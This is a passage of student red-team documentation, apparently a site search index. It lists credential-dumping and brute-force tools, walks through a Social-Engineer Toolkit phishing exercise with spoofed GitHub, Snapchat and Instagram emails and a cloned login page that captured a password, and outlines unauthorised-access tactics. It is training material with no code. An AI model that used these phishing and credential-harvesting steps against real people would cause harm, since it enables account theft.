Mimikatz is a powerful tool used for extracting plaintext passwords, hashes, and other credentials from compromised systems. It enables us to perform credential dumping, allowing us to harvest credentials stored in memory or on disk, including those associated with accounts with elevated privileges.LaZagne: LaZagne is another credential recovery tool that specializes in retrieving passwords stored on local systems. It supports various applications and platforms, making it useful for extracting credentials from a wide range of sources.CrackMapExec: CrackMapExec is a versatile post-exploitation tool that enables us to perform credential-based attacks across Windows networks. It supports functionalities such as brute force attacks, credential dumping, and lateral movement, making it valuable for testing the organization's resilience against credential theft.Hydra: Hydra is a popular password-cracking tool that supports multiple protocols and services, allowing us to conduct brute force attacks against authentication mechanisms. By systematically guessing passwords, Hydra helps us test the strength of user credentials and assess the organization's susceptibility to password-based attacks.Credential dumping: Credential dumping refers to the extraction of authentication credentials from compromised systems. Techniques like Mimikatz and LaZagne facilitate credential dumping by retrieving plaintext passwords, hashes, and other credential data stored on target systems.Brute force attacks: Brute force attacks involve systematically guessing passwords until the correct one is found. Tools like Hydra enable us to automate this process and test the strength of user passwords across various services and protocols.  ","version":"Next","tagName":"h3"},{"title":"8 Conclusion​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#8-conclusion","content":" The red team simulations have given us important insights into how well the organization can handle and respond to threats aiming for root access. We've pinpointed areas where our access controls, privilege management, incident response procedures, and employee awareness need improvement. These findings will help us bolster our defenses, proactively implement security measures, and better defend against ever-changing cyber threats. As the threat landscape evolves, ongoing red team exercises will be crucial to keeping the organization ready and alert to new risks. ","version":"Next","tagName":"h2"},{"title":"SET Email Phishing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#introduction","content":" Email phishing is a cyberattack where attackers steal sensitive information, like usernames or passwords, by posing as legitimate sources through deceptive emails. These emails are crafted to look trustworthy, luring victims into providing personal data, similar to how bait attracts fish. With the growing reliance on email communication, email phishing has become increasingly common. Tools like the Social Engineering Toolkit (SET) are often used to execute these attacks, making the phishing emails appear...  ","version":"Next","tagName":"h2"},{"title":"Rules of Engagement:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#rules-of-engagement","content":" Social Engineering only on Redback Operations Students or Redback Mentors  ","version":"Next","tagName":"h2"},{"title":"Tool Used:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#tool-used","content":" ","version":"Next","tagName":"h2"},{"title":"Social Engineering Toolkit (SET)​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#social-engineering-toolkit-set","content":" The Social-Engineer Toolkit (SET) was created and written by Dave Kennedy, the founder of TrustedSec. It is an open-source Python-driven tool aimed at penetration testing around Social-Engineering. It allows users to simulate real-world phishing scenarios to understand the tactics used by cybercriminals and test the resilience of their security infrastructure.  ","version":"Next","tagName":"h3"},{"title":"Installation:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#installation","content":" Open a terminal in Kali Linux and follow these steps:  Step 1: Update the package list Step 2: Install SET Step 3: Verify the installation by launching SET  This will launch the Social Engineering Toolkit, allowing you to start using it for various social engineering and phishing campaigns.  ","version":"Next","tagName":"h2"},{"title":"Phishing Campaign:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#phishing-campaign","content":" SET launches with a menu offering various options. To start using it for social engineering attacks, you need to select the first option from the menu, which is &quot;Social-Engineering Attacks.&quot; This option enables you to execute different techniques, including phishing simulations.    After selecting &quot;Social-Engineering Attacks,&quot; we are presented with several attack vectors. To conduct a phishing campaign, choose &quot;Mass Mailer Attack.&quot; This method allows attackers to send bulk phishing emails to multiple recipients at once or a single person appearing as legitimate messages from trusted sources. Mass mailer attacks are effective due to their wide reach, making it easier for attackers to target a larger number of potential victims in a single attempt.    In this step, select the option to send a single email, and the email was configured using a Gmail account, with a Gmail App Password created for authentication.  Example-1: The display name was set as &quot;GitHub Support Team&quot; to make the email appear legitimate. The subject was &quot;Verify your GitHub Account,&quot; and an HTML format was used to warn the recipient of unusual activity, prompting them to click a malicious link (using the Kali Linux IP) to prevent unauthorized access. The email was sent to the first student from Redback Operations as part of the phishing campaign.    Example-2: The phishing email was sent to the second student from Redback Operations, appearing to come from &quot;Snapchat Support.&quot; The subject was &quot;Your Snapchat Account Needs Immediate Attention,&quot; with a malicious link designed to capture the recipient’s login credentials.    Example-3: The phishing email was sent to the third student from Redback Operations, appearing to be from the &quot;Instagram Security Team.&quot; The subject was &quot;Your Instagram Account is Hacked,&quot; with a malicious link intended to capture the recipient's login credentials.    ","version":"Next","tagName":"h2"},{"title":"Website Cloning:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#website-cloning","content":" This process involves building a fake version of a legitimate website to deceive users into submitting their sensitive information, like usernames and passwords, on the counterfeit site. The website is then incorporated into a phishing email, which is sent to the target to capture their personal data.  Open Social engineering toolkit in Kali Linux. Then, select social engineering attacks and then website attack vectors. This menu offers several methods for conducting web-based attacks, including Java applet attacks, credential harvesting, tabnabbing, and more.    Select the Credential Harvester Attack Method, which captures login credentials from a cloned website when the user enters their sensitive information. It stores the harvested data for later analysis. Next, select the Site Cloner option. This method allows us to create an exact replica of a legitimate website. The cloned site will be used to capture credentials when a target interacts with it, thinking it is the real site. Enter the Kali Linux IP address and then Enter.    Enter the cloned website URL, then SET will create an identical copy of the website login page and host it on a local server. When a victim accesses this cloned page and enters their login credentials, SET will capture the submitted data (username and password).  ","version":"Next","tagName":"h2"},{"title":"Phishing Mails Sent to Targeted Students​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#phishing-mails-sent-to-targeted-students","content":" The phishing emails was sent to all three students from Redback Operations. Each email was tailored to appear as a legitimate security notification, targeting Instagram, Snapchat, and GitHub accounts.    This screenshot shows the phishing email successfully received by the student.    Demonstration:  For demonstration purposes, I sent the phishing email to my own Gmail account. This allowed me to simulate a phishing campaign and monitor the email delivery process without causing harm to others. I used Kali Linux to run the SET for generating the phishing email and creating the fake login page. For testing, I used Windows 10 to access the cloned page. However, the phishing link did not work on my host computer, likely due to network or server configuration issues.    Accesing the link in Windows 10 VM:​    Clicking the Link and Entering the Login Details:​    Errors to Solve:​ Add import htmlReplace cgi.escape to html.escape    When I entered the login details for the first time, the website captured my credentials but did not proceed to the actual login. Instead, it redirected me to the same login page, leading me to believe that I might have entered the wrong credentials.​    This the Kali Terminal after I opened the link and entered my details.​    ","version":"Next","tagName":"h2"},{"title":"Credential Capture Process:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#credential-capture-process","content":" User Interaction: When I clicked the link, it showed that a user at IP address 192.168.1.113 interacted with the cloned GitHub login page.POST Request: The user submitted a POST request to the cloned page, which typically happens when a user enters their credentials (username and password) and clicks the login button.  ","version":"Next","tagName":"h3"},{"title":"Captured Data:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#captured-data","content":" POSSIBLE USERNAME FIELD FOUND: The tool identified the username as Manasa-44.POSSIBLE PASSWORD FIELD FOUND: The tool captured the password associated with this username.This indicates that the user entered these credentials into the cloned login page, and the tool successfully intercepted and logged them.  ","version":"Next","tagName":"h3"},{"title":"Findings:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#findings","content":" Phishing Email Delivery: The phishing email was successfully delivered to one student whose Deakin email starts with their name.Undelivered Emails: Two students with Deakin emails starting with student IDs (s22...) did not receive the emails.Successful Credential Harvesting: The Social-Engineer Toolkit was able to clone the GitHub login page and successfully capture a username and password when the user attempted to log in.Use of a Local Network: The IP address 192.168.1.113 shows that the user accessing the cloned page is within the same local network as the attacker's machine (which has the IP 192.168.1.111).Stronger Spam Filters: Deakin's email system likely has stricter spam filters for student ID-based addresses, blocking the phishing emails.Lower Suspicion for Name-Based Emails: Emails with name-based addresses might bypass stricter filters, as they are perceived as less likely targets for spam.Better Email Reputation: Name-based emails could have better reputations in the system, reducing the chances of being flagged as spam.Blocked Link on Host Machine: When I tried to open the link in my host machine, it didn’t work. The email system or browser security might be blocking the link as part of anti-phishing measures. Many modern security tools automatically block suspicious URLs.This demonstrates how phishing attacks can be conducted in a controlled environment. The attacker can now use the captured credentials to access the user’s account if the credentials are valid.  ","version":"Next","tagName":"h2"},{"title":"Conclusion:​","type":1,"pageTitle":"SET Email Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/SETPhishing#conclusion","content":" This demonstration effectively showcased the process of conducting a phishing attack in a controlled environment using the Social Engineering Toolkit (SET). By sending phishing emails and cloning legitimate login pages, I simulated a scenario where sensitive credentials were captured. Although some phishing emails were blocked due to spam filters, this highlighted the importance of email filtering systems. Additionally, the successful credential harvesting in a local network environment emphasizes how phishing attacks can be executed. The failure of the phishing link on the host machine underlines the importance of correct network configurations during testing. To mitigate such risks, organizations should implement multi-factor authentication (MFA), conduct regular user awareness training, use strong spam filters, and employ network monitoring tools to detect suspicious activity. These measures are essential to defending against phishing attacks and minimizing their impact. ","version":"Next","tagName":"h2"},{"title":"Unauthorised-Access-Red-Team-Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase","content":"","keywords":"","version":"Next"},{"title":"Unauthorised-Access Red Team Usecase​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#unauthorised-access-red-team-usecase","content":" Unauthorised Access Red Team Usecase  info Effective Date: 6 MAY 2024. Last Edited: 6 MAY 2024. Author: Liya Thomas Document Reference: UARTU-1 Expiry Date: 6 MAY 2025. Version: 1.0.  ","version":"Next","tagName":"h2"},{"title":"1. Introduction​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#1-introduction","content":" Unauthorized access incidents present grave threats to organizations, risking data breaches, financial harm, and reputational damage. Red team exercises play a pivotal role in emulating these attacks, evaluating security protocols, and fortifying incident response capabilities. This playbook serves as a comprehensive guide delineating diverse unauthorized access scenarios. It furnishes clear objectives, systematic steps, essential tools, and effective techniques tailored to each attack type. By meticulously detailing these simulations, organizations can better understand their vulnerabilities, fortify defenses, and refine response strategies, ultimately fostering a robust security posture in the face of evolving threats.  ","version":"Next","tagName":"h2"},{"title":"2 Unauthorized Login Attempts​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#2-unauthorized-login-attempts","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#21-objective","content":" Unauthorized login attempts aim to breach security defenses and gain illicit access to accounts, systems, or applications, leveraging techniques like password guessing, stolen credentials, or brute-force attacks. Such infiltration poses grave risks to data integrity and confidentiality, underscoring the importance of robust security measures.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#22-steps","content":" Reconnaissance: In the reconnaissance phase, attackers meticulously gather intelligence about the target, including system configurations, user accounts, and potential vulnerabilities. This involves scanning network infrastructures, analyzing publicly available information, and conducting social engineering to ascertain valuable insights.Password Guessing: Password guessing employs automated tools like Hydra, renowned for its effectiveness in launching systematic login attempts to crack passwords. Attackers utilize dictionaries, common passwords, and known patterns to guess credentials, exploiting weak password policies or user negligence.Credential Stuffing: Credential stuffing automates the input of stolen credentials obtained previous data breaches or leaks. Tools such as Sentry MBA streamline this process, enabling attackers to efficiently test large volumes of username-password pairs against various online services, exploiting users' tendencies to reuse passwords across multiple platforms.Brute Force Attack: Brute force attacks, executed using tools like THC-Hydra, involve systematically trying every possible combination of usernames and passwords until the correct one is discovered. This method is resource-intensive but can be devastatingly effective against weak or improperly secured systems, emphasizing the importance of strong password policies and rate limiting.Exploit Valid Credentials: Once valid credentials are obtained, attackers gain unauthorized access to the target system, potentially compromising sensitive data, installing malware, or further escalating their attack. Exploiting valid credentials underscores the significance of robust authentication mechanisms, continuous monitoring, and user education to mitigate the risk of insider threats or account compromise.  ","version":"Next","tagName":"h2"},{"title":"2.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#23-tools-and-techniques","content":" Hydra: Hydra is a versatile and widely used tool in unauthorized login attempts. Its comprehensive features enable attackers to conduct efficient password guessing attacks across various protocols and services, aiding in the identification of weak authentication mechanisms.Sentry MBA: Sentry MBA is a specialized tool designed for credential stuffing attacks. Its automation capabilities streamline the process of testing stolen credentials against multiple online services, maximizing the efficiency and scale of the attack while minimizing the manual effort required.THC-Hydra: THC-Hydra is renowned for its brute force capabilities, enabling attackers to systematically try millions of username-password combinations to gain unauthorized access. Its versatility and speed make it a formidable tool in penetrating even well-defended systems, highlighting the importance of implementing strong authentication measures and monitoring for suspicious activity.  ","version":"Next","tagName":"h3"},{"title":"3 Exploiting Vulnerabilities​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#3-exploiting-vulnerabilities","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#31-objective","content":" The primary objective in exploiting vulnerabilities is to take advantage of weaknesses in hardware, software, or configurations to gain unauthorized access, posing significant risks to system integrity and confidentiality.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#32-steps","content":" Vulnerability Scanning:Vulnerability scanning, facilitated by tools like Nessus, involves thorough examination of target systems for known vulnerabilities, misconfigurations, or outdated software versions. This process yields insights into potential entry points for exploitation, forming the foundation of subsequent attack strategies.  Exploit Development:Upon identifying vulnerabilities during the scanning phase, attackers embark on exploit development. This entails crafting or acquiring exploit code tailored to specific vulnerabilities, creating payloads or scripts capable of leveraging weaknesses to gain unauthorized access to target systems.Exploit Execution:Executing exploits using tools such as Metasploit automates the process of compromising vulnerable systems. Metasploit's extensive library of pre-built exploits streamlines the attack process, allowing attackers to launch attacks against a wide range of targets efficiently and effectively.Persistence:Establishing persistence with tools like Meterpreter is crucial for maintaining access to compromised systems post-exploitation. Meterpreter enables attackers to maintain control over compromised infrastructure by offering a range of post-exploitation capabilities, including file system manipulation, privilege escalation, and network reconnaissance. -Cover Tracks:To evade detection and conceal the intrusion, attackers may delete logs or manipulate system records, effectively covering their tracks. This step is essential for hindering forensic investigation and attribution, prolonging the duration of unauthorized access.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#33-tools-and-techniques","content":" Nessus:Nessus is a powerful vulnerability assessment tool that identifies security vulnerabilities, configuration issues, and malware in systems. Its comprehensive scanning capabilities provide valuable insights into potential attack vectors, guiding the development of effective exploitation strategies.Metasploit:Metasploit is a widely-used framework for developing and executing exploits. Its extensive collection of tools and modules for penetration testing makes it a preferred choice for both red teams and attackers, streamlining the process of exploit execution and post-exploitation activities. Meterpreter: Meterpreter is a versatile post-exploitation tool used to establish persistence and gain deeper access to compromised systems. Its rich set of features enables attackers to maintain control over compromisedinfrastructure, facilitating further exploitation and data exfiltration.  ","version":"Next","tagName":"h3"},{"title":"4. Social Engineering Attacks​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#4-social-engineering-attacks","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#41-objective","content":" Social engineering attacks aim to manipulate individuals into divulging private information or taking actions that compromise security, exploiting human psychology rather than technical vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#42-steps","content":" Phishing: Phishing involves sending deceptive emails masquerading as legitimate sources to entice recipients into revealing sensitive information such as login credentials or financial details. These emails often contain links to malicious websites or attachments containing malware.Pretexting: Pretexting involves fabricating scenarios or personas to deceive targets into disclosing information or performing specific actions. This technique relies on building rapport and trust to manipulate individuals, often leading to the unwitting disclosure of sensitive information.Baiting:Baiting involves enticing targets with promises of rewards or incentives to lure them into clicking on malicious links or downloading malware. This technique exploits human curiosity or greed, capitalizing on the willingness of individuals to engage with enticing offers.Tailgating: Tailgating exploits physical security weaknesses by following authorized personnel into restricted areas without proper authentication. This technique relies on social engineering tactics to bypass access controls, allowing attackers to gain unauthorized access to secure facilities.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#43-tools-and-techniques","content":" Email Spoofing - Email spoofing involves forging the sender's email address to appear as if it originated from a trusted source, enhancing the credibility of phishing or pretexting attempts. This technique increases the likelihood of successful social engineering attacks by tricking recipients into believing that the email is legitimate.Social Engineering Toolkit (SET): The Social Engineering Toolkit (SET) is a comprehensive framework for automating social engineering attacks. It offers a range of tools and modules for phishing, credential harvesting, and exploiting human vulnerabilities, streamlining the process of launching and executing social engineering attacks.  ","version":"Next","tagName":"h3"},{"title":"5 Insider Threats​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#5-insider-threats","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#51-objective","content":" Insider threats involve exploiting authorized access to resources, data, or systems for malicious purposes, posing a significant risk to data confidentiality, integrity, and availability.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#52-steps","content":" User Activity Monitoring:Monitoring the activities of authorized users helps detect suspicious behavior or unauthorized access attempts, providing early warning signs of insider threats. This proactive approach enables organizations to identify and mitigate insider threats before they can cause significant harm.Access Limits: Restricting access based on roles and responsibilities ensures that users only have access to the resources necessary to perform their job functions. By implementing access limits, organizations can minimize the risk of unauthorized data access or misuse by limiting the scope of user privileges.Least Privilege:Implementing the principle of least privilege ensures that users are granted only the minimum level of access required to perform their duties. By adhering to this principle, organizations can reduce the potential impact of insider threats by limiting the extent of access granted to users, thereby minimizing the risk of unauthorized data access or misuse.Security Awareness Training: Training staff to recognize and report suspicious behavior or security incidents helps build a culture of security awareness within an organization. By educating employees about the potential risks posed by insider threats and empowering them to play an active role in defending against such threats, organizations can significantly enhance their security posture and mitigate the risk of insider attacks.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#53-tools-and-techniques","content":" User Activity Monitoring Tools: User activity monitoring tools track and log user actions, providing visibility into user behavior and identifying anomalies indicative of insider threats. By monitoring user activities, organizations can detect and investigate suspicious behavior, enabling them to mitigate the risk of insider threats proactively.Role-based Access Control (RBAC): RBAC restricts access to resources based on predefined roles and responsibilities, ensuring that users only have access to the information and systems necessary for their job functions. By implementing RBAC, organizations can enforce access controls effectively, minimizing the risk of unauthorized data access or misuse by limiting access to authorized users based on their roles and responsibilities.  ","version":"Next","tagName":"h3"},{"title":"6 Backdoor Access​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#6-backdoor-access","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#61-objective","content":" The primary objective of establishing backdoor access is to create covert entry points within systems or networks, enabling unauthorized access while evading detection.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#62-steps","content":" Secret Communication Channels: Establishing covert communication channels is crucial for maintaining stealthy access to compromised systems. By using encryption and obfuscation techniques, attackers can conceal communication traffic, making it difficult for security monitoring systems to detect unauthorized activity.Default Credentials: Exploiting default credentials is a common tactic used by attackers to gain access to systems or devices. Manufacturers often use default usernames and passwords, which are widely known and easily exploitable if not changed by system administrators. Attackers capitalize on this oversight to gain unauthorized access without raising suspicion.Exploiting Flaws: Taking advantage of vulnerabilities in systems or applications provides attackers with an opportunity to create backdoor access. By exploiting flaws such as buffer overflows, injection vulnerabilities, or insecure configurations, attackers can bypass security controls and establish persistent access to compromised systems.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#63-tools-and-techniques","content":" Covert Communication Tools: Tools designed for covert communication, such as steganography tools or custom-built communication protocols, enable attackers to conceal their activities within legitimate network traffic, making it challenging for security teams to detect unauthorized access.Exploit Development Frameworks:Exploit development frameworks provide attackers with the necessary tools and resources to develop exploits for targeting specific vulnerabilities. These frameworks streamline the process of identifying, developing, and deploying exploits, allowing attackers to exploit flaws effectively and establish backdoor access to target systems.  ","version":"Next","tagName":"h3"},{"title":"7 Privilege Escalation​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#7-privilege-escalation","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#71-objective","content":" Privilege escalation involves increasing rights within a system or network, enabling attackers to access sensitive resources and perform unauthorized actions.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#72-steps","content":" Poor Authentication Procedures: Exploiting weak authentication procedures is a common tactic used by attackers to escalate privileges within a system. Weak passwords, insecure password storage mechanisms, and inadequate access controls can all be exploited to gain elevated privileges and access sensitive data or functionality.Misconfigured Permissions: Abusing misconfigured permissions is another method used by attackers to escalate privileges within a system. Improperly configured access control lists (ACLs), file system permissions, or user roles can provide attackers with unauthorized access to sensitive resources, allowing them to escalate privileges and perform malicious actions.Software Vulnerabilities: Exploiting software vulnerabilities is a potent method for privilege escalation. Vulnerabilities such as buffer overflows, injection flaws, or insecure configuration settings can be exploited to execute arbitrary code with elevated privileges, enabling attackers to gain full control over a compromised system.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#73-tools-and-techniques","content":" Exploit Development Tools: Exploit development tools provide attackers with the necessary resources to identify and exploit software vulnerabilities effectively. These tools streamline the process of developing and deploying exploits, allowing attackers to escalate privileges within target systems and access sensitive resources.System Configuration Analysis Tools: System configuration analysis tools help attackers identify misconfigured permissions or inadequate access controls within target systems. By analyzing system configurations, attackers can identify potential privilege escalation opportunities and exploit them to gain elevated privileges.  ","version":"Next","tagName":"h3"},{"title":"8 Data Breaches​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#8-data-breaches","content":"   ","version":"Next","tagName":"h2"},{"title":"8.1 Objective:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#81-objective","content":" The primary objective of data breaches is to obtain sensitive information without authorization, potentially leading to financial losses, reputational damage, and legal consequences.  ","version":"Next","tagName":"h3"},{"title":"8.2 Steps:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#82-steps","content":" Social Engineering Attacks:Compromising credentials through social engineering attacks, such as phishing or pretexting, is a common tactic used by attackers to gain unauthorized access to sensitive information. By tricking users into divulging their credentials, attackers can bypass authentication controls and access sensitive data.Exploiting Vulnerabilities: Gaining unauthorized access to databases or other data repositories by exploiting vulnerabilities is another method used by attackers to execute data breaches. Vulnerabilities such as SQL injection, cross-site scripting (XSS), or unpatched software flaws can be exploited to access and exfiltrate sensitive data withoutauthorization.Account Compromises: Exploiting weak authentication mechanisms or default credentials to compromise user accounts is a straightforward method for executing data breaches. By gaining unauthorized access to user accounts, attackers can access sensitive data stored within user profiles or personal information database.  ","version":"Next","tagName":"h3"},{"title":"8.3 Tools and Techniques:​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#83-tools-and-techniques","content":" Password Cracking Tools: Password cracking tools enable attackers to brute-force or guess user passwords, allowing them to gain unauthorized access to user accounts and execute data breaches. These tools leverage various techniques, such as dictionary attacks, brute-force attacks, or rainbow tables, to crack passwords and access sensitive information.SQL Injection Tools:SQL injection tools facilitate the exploitation of SQL injection vulnerabilities in web applications or database systems, enabling attackers to execute unauthorized SQL queries and access sensitive data stored within databases.These tools automate the process of identifying and exploiting SQL injectionvulnerabilities, making it easier for attackers to execute data breaches.  ","version":"Next","tagName":"h3"},{"title":"9 Conclusion​","type":1,"pageTitle":"Unauthorised-Access-Red-Team-Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Unauthorised-Access-Red-Team-Usecase#9-conclusion","content":" Red team exercises are indispensable for identifying vulnerabilities, evaluating security controls, and enhancing incident response capabilities within organizations. By simulating unauthorized access scenarios, organizations can better prepare for real-world threats and mitigate risks effectively. Through systematic assessments and proactive defense strategies, organizations can strengthen their security posture and safeguard against evolving cyber threats ","version":"Next","tagName":"h2"},{"title":"Virus Outbreak Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#1-introduction","content":" In the perpetual battle against cyber threats, the specter of virus outbreaks looms large, posing formidable challenges to organizational security. From insidious file infectors to stealthy network viruses, the arsenal of malicious actors continues to evolve, necessitating a comprehensive understanding of these attack vectors. In this red team exercise, we embark on a journey through various virus attack types, each presenting unique complexities and implications. By immersing ourselves in simulated scenarios, we aim to evaluate the resilience of organizational defenses and enhance preparedness to confront these pervasive threats head-on.  ","version":"Next","tagName":"h2"},{"title":"2. File Infector Virus :​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#2-file-infector-virus-","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#21-objective","content":" The primary aim of deploying a file infector virus as part of a red team exercise is to showcase the ease with which such malware can spread within a targeted system and 